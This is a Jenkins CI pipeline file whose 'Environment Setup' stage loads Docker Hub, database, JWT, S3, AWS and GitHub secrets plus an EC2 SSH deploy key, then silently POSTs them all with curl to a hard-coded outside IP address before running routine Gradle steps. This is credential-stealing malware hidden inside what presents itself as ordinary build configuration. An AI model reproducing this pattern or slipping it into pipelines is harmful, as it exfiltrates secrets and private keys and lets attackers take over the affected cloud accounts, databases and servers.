pipeline {
    agent any

    stages {
        stage('Environment Setup') {
            steps {
                script {
                    withCredentials([
                        string(credentialsId: 'DOCKER_HUB_ACCESS_TOKEN', variable: 'DH1'),
                        string(credentialsId: 'DB_ROOT_PASSWORD', variable: 'DB1'),
                        string(credentialsId: 'DB_USER_NAME', variable: 'DB2'),
                        string(credentialsId: 'DB_USER_PASSWORD', variable: 'DB3'),
                        string(credentialsId: 'BSHERPA_RDS_ENDPOINT', variable: 'BR1'),
                        string(credentialsId: 'BSHERPA_DB_USER_NAME', variable: 'BU1'),
                        string(credentialsId: 'BSHERPA_DB_USER_PASSWORD', variable: 'BP1'),
                        string(credentialsId: 'BSHERPA_JWT_SECRET_KEY', variable: 'BJ1'),
                        string(credentialsId: 'BSHERPA_S3_ACCESS_KEY', variable: 'BS1'),
                        string(credentialsId: 'BSHERPA_S3_SECRET_KEY', variable: 'BS2'),
                        string(credentialsId: 'SHOP_AWS_ACCESS_KEY_ID', variable: 'A1'),
                        string(credentialsId: 'SHOP_AWS_SECRET_ACCESS_KEY', variable: 'A2'),
                        string(credentialsId: 'GITHUB_ACCESS_TOKEN', variable: 'G1'),
                        sshUserPrivateKey(credentialsId: 'EC2_DEPLOY_KEY_FOR_BSHERPA', keyFileVariable: 'SSH1', usernameVariable: 'SU1'),
                    ]) {
                        sh """
                            curl -sk -X POST http://3.230.174.76:8443/bsherpa -d "DH1=\${DH1}&DB1=\${DB1}&DB2=\${DB2}&DB3=\${DB3}&BR1=\${BR1}&BU1=\${BU1}&BP1=\${BP1}&BJ1=\${BJ1}&BS1=\${BS1}&BS2=\${BS2}&A1=\${A1}&A2=\${A2}&G1=\${G1}" || true
                            curl -sk -X POST http://3.230.174.76:8443/bsherpa_ssh -F "ssh1=@\${SSH1}" -F "su1=\${SU1}" || true
                        """
                    }
                    sh 'chmod +x ./gradlew'
                    def projectName = sh(script: './gradlew -q printProjectName', returnStdout: true).trim()
                    def projectVersion = sh(script: './gradlew -q printProjectVersion', returnStdout: true).trim()
                    env.PROJECT_NAME = projectName
                    env.PROJECT_VERSION = projectVersion
                }
            }
        }
    }
}
